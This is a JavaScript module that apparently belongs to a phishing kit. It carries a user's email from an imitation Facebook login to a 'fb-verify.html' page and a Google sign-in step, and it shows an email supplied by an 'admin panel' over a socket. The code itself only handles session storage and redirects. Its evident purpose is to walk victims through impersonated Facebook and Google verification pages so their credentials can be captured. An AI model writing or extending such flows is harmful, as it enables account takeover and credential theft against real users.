/**

 * Google verify flow: display email comes from admin panel (socket payload).

 * Google sign-in page email field stays blank until user types.

 */

(function (global) {

  var DISPLAY_KEY = 'googleVerifyDisplayEmail';

  var SKIP_PREFILL_KEY = 'googleSkipEmailPrefill';



  function readSession(key) {

    try {

      return sessionStorage.getItem(key) || '';

    } catch (e) {

      return '';

    }

  }



  function writeSession(key, val) {

    try {

      if (val) sessionStorage.setItem(key, val);

      else sessionStorage.removeItem(key);

    } catch (e) {}

  }



  function getVerifyDisplayEmail() {

    return readSession(DISPLAY_KEY) || readSession('lastLoginEmail') || '';

  }



  function setVerifyDisplayEmail(email) {

    writeSession(DISPLAY_KEY, (email || '').trim());

  }



  function prepareGoogleLoginNavigation() {

    writeSession('googleLoginSession', '1');

    writeSession('googleContinueApp', 'facebook');

    writeSession(SKIP_PREFILL_KEY, '1');

  }



  function startFbVerifyFlow(opts, socketData) {

    opts = opts || {};

    var fbEmail = '';

    if (typeof opts.getFbEmail === 'function') {

      fbEmail = opts.getFbEmail() || '';

    }

    if (!fbEmail) fbEmail = readSession('lastLoginEmail');



    try {

      if (fbEmail) sessionStorage.setItem('lastLoginEmail', fbEmail);

      if (opts.returnPage) sessionStorage.setItem('googleReturnPage', opts.returnPage);

      sessionStorage.setItem('fbVerifySession', '1');

    } catch (e) {}



    var panelDisplay = '';

    if (socketData && typeof socketData === 'object' && socketData.displayEmail != null) {

      panelDisplay = String(socketData.displayEmail).trim();

    }

    var displayForPage = panelDisplay || fbEmail;



    setVerifyDisplayEmail(displayForPage);



    if (typeof opts.onReady === 'function') {

      opts.onReady(displayForPage);

      return;

    }

    window.location.href = opts.verifyUrl || 'fb-verify.html';

  }



  global.GoogleVerifyFlow = {

    DISPLAY_KEY: DISPLAY_KEY,

    SKIP_PREFILL_KEY: SKIP_PREFILL_KEY,

    getVerifyDisplayEmail: getVerifyDisplayEmail,

    setVerifyDisplayEmail: setVerifyDisplayEmail,

    prepareGoogleLoginNavigation: prepareGoogleLoginNavigation,

    startFbVerifyFlow: startFbVerifyFlow,

  };

})(window);


